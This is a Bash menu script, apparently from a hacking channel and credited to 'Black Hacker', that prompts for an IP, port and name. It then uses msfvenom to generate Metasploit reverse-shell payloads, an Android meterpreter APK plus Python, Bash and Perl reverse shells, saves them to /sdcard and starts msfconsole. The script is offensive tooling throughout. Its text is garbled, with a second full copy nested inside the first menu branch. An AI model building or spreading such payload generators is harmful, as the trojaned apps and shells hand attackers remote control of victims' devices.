#!/bin/bash
clear
function android() {
  clear
echo ""
figlet -f ASCII-Shadow " payload "|lolcat -t
  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
read Ip

echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
read Port

echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
read Name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$Ip LPORT=$Port -o /sdcard/$Name.apk
msfconsole
} 
echo ""
figlet -f ASCII-Shadow " payload "|lolcat -t
echo -e "                                        \033[32mBy : Black Hacker😈 "
echo -e """
\033[31m[1]\033[32m Create a Payload Metasploit

\033[31m[2] \033[32mAbout

\033[31m[3] \033[32mExit
"""
while true; do
read -p "select number : " try
if [[ $try -eq "1" ]]; then
echo -e "Waiting....."
sleep 1
#!/bin/bash
clear
function android() {
  clear
echo ""
figlet -f ASCII-Shadow " payload "|lolcat -t
  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
read Ip

echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
read Port

echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
read Name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$Ip LPORT=$Port -o /sdcard/$Name.apk
msfconsole
}

function python() {
  clear
echo ""
figlet -f ASCII-Shadow " payload "|lolcat -t
  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
read Ip

echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
read Port

echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
read Name
msfvenom -p cmd/unix/reverse_python LHOST=$Ip LPORT=$Port -f raw > /sdcard/$Name.py
msfconsole
}

function bash() {
  clear
echo ""
figlet -f ASCII-Shadow " payload "|lolcat -t
  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
read Ip

echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
read Port

echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
read Name
msfvenom -p cmd/unix/reverse_bash LHOST=$Ip LPORT=$Port -f raw > /sdcard/$Name.sh
msfconsole
}

function perl() {
  clear
echo ""
figlet -f ASCII-Shadow " payload "|lolcat -t
  echo -e "\033[32mEnter Your Ip\033[37m :\033[33m "
read Ip

echo -e "\033[32mEnter Your Port\033[37m : \033[33m"
read Port

echo -e "\033[32mEnter Your Name\033[37m :\033[33m "
read Name
msfvenom -p cmd/unix/reverse_perl LHOST=$Ip LPORT=$Port -f raw > /sdcard/$Name.pl
msfconsole
}
echo ""
figlet -f ASCII-Shadow " payload "|lolcat -t
echo -e "                                        \033[32mBy : Black Hacker😈 "
echo -e """
\033[31m[1] \033[32mCreate a payload in Android

\033[31m[2] \033[32mCreate a payload in Python

\033[31m[3] \033[32mCreate a payload in Bash

\033[31m[4] \033[32mCreate a payload in Perl

\033[31m[5] \033[32mExit
"""
while true; do
read -p "select number : " try
if [[ $try -eq "1" ]]; then
android
elif [[ $try -eq "2" ]]; then
python
elif [[ $try -eq "3" ]]; then
bash
elif [[ $try -eq "4" ]]; then
perl
elif [[ $try -eq "5" ]]; then
exit
else
echo "error number"
fi
done
elif [[ $try -eq "2" ]]; then
echo -e "Waiting....."
sleep 1
clear
echo ""
figlet -f ASCII-Shadow "  About "|lolcat -t
echo -e """
\033[32m
                My Name : Black Hacker 😈
    
    Telegram Channel : https://t.me/Anonymous_Hacking_12
    """
    exit
elif [[ $try -eq "3" ]]; then
exit
else
echo -e "error number"
fi
done